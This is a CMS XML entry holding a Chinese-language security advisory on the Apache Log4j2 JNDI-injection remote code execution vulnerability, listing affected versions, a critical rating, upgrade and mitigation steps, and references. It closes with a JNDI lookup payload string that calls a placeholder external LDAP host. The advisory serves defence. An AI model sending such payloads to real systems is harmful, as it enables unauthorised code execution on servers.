<?xml version="1.0" encoding="UTF-8"?>
<item><pubDate>Sat, 11 Dec 2021 12:31:23 +0800</pubDate><title><![CDATA[【漏洞预警】Apache Log4j 远程代码执行漏洞]]></title><url><![CDATA[apache-log4j]]></url><meta><![CDATA[]]></meta><metad><![CDATA[]]></metad><menu><![CDATA[]]></menu><menuOrder><![CDATA[0]]></menuOrder><menuStatus><![CDATA[]]></menuStatus><template><![CDATA[template.php]]></template><parent><![CDATA[]]></parent><content><![CDATA[&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;01&lt;/p&gt;

&lt;p&gt;漏洞描述&lt;/p&gt;

&lt;p&gt;　　Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。经过分析，该组件存在Java JNDI注入漏洞，当程序将用户输入的数据进行日志，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;02&lt;/p&gt;

&lt;p&gt;漏洞评级&lt;/p&gt;

&lt;p&gt;严重&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;03&lt;/p&gt;

&lt;p&gt;影响范围&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;2.0 &amp;lt;= Apache log4j2 &amp;lt;= 2.15.0-RC1&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;04&lt;/p&gt;

&lt;p&gt;修复建议&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;1、升级Apache Log4j2所有相关应用到最新版本&lt;/p&gt;

&lt;p&gt;https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2&lt;/p&gt;

&lt;p&gt;2、升级已知受影响的应用及组件到最新版本&lt;/p&gt;

&lt;p&gt;3、临时关闭&lt;/p&gt;

&lt;p&gt;log4j2.formatMsgNoLookups=True&lt;/p&gt;

&lt;p&gt;//&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;参考资料&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;https://github.com/apache/logging-log4j2&lt;/p&gt;

&lt;p&gt;https://github.com/apache/logging-log4j2/commit/7fe72d6&lt;/p&gt;

&lt;p&gt;https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;${jndi:ldap://xxxxx.dnslog.xx/exp}&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
]]></content><private><![CDATA[]]></private><author><![CDATA[admin]]></author></item>
